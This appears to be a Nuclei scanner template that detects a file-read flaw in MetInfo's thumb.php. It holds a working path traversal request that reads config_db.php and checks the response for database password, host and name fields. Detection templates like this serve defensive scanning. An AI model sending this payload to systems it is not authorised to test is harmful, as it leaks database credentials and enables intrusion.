id: metinfo-file-read
info:
  name: Metinfo File Read
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template detects a file read vulnerability in MetInfo through the 'thumb.php' script, which can disclose sensitive database configuration details.
  tags: file-read
http:
  - method: GET
    path:
      - "{{BaseURL}}/include/thumb.php?dir=http/.....///.....///config/config_db.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "con_db_pass"
          - "con_db_host"
          - "con_db_name"
        part: body
